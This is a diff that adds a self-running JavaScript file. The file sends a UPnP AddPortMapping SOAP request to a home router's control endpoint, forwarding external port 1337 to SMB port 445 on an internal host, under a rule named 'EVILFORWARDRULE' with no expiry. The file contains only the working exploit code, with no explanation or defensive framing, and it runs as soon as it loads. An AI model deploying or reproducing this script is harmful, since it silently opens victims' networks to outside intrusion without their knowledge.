@@ -1,0 +1,48 @@
+var req;
+var url="/upnp/control/igd/wanpppcInternet";
+
+function loadXMLDoc(url) {
+	req = false;
+    // branch for native XMLHttpRequest object
+    if(window.XMLHttpRequest && !(window.ActiveXObject)) {
+    	try {
+			req = new XMLHttpRequest();
+        } catch(e) {
+			req = false;
+        }
+    // branch for IE/Windows ActiveX version
+    } else if(window.ActiveXObject) {
+       	try {
+        	req = new ActiveXObject("Msxml2.XMLHTTP");
+      	} catch(e) {
+        	try {
+          		req = new ActiveXObject("Microsoft.XMLHTTP");
+        	} catch(e) {
+          		req = false;
+        	}
+		}
+    }
+	if(req) {
+		req.onreadystatechange = processReqChange;
+		req.open("POST", url, true);
+		req.setRequestHeader('SOAPAction', '"urn:schemas-upnp-org:service:WANPPPConnection:1#AddPortMapping"');
+
+		req.send('<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewRemoteHost xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string"></NewRemoteHost><NewExternalPort xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="ui2">1337</NewExternalPort><NewProtocol xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string">TCP</NewProtocol><NewInternalPort xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="ui2">445</NewInternalPort><NewInternalClient xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string">192.168.1.64</NewInternalClient><NewEnabled xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="boolean">1</NewEnabled><NewPortMappingDescription xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string">EVILFORWARDRULE</NewPortMappingDescription><NewLeaseDuration xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="ui4">0</NewLeaseDuration></m:AddPortMapping></SOAP-ENV:Body></SOAP-ENV:Envelope>');
+	}
+}
+
+function processReqChange() {
+    // only if req shows "loaded"
+    if (req.readyState == 4) {
+        // only if "OK"
+        if (req.status == 200) {
+            // ...processing statements go here...
+		//alert(req.responseText);
+        } else {
+            alert("There was a problem retrieving the XML data:\n" + req.statusText);
+        }
+    }
+}
+
+
+loadXMLDoc(url);
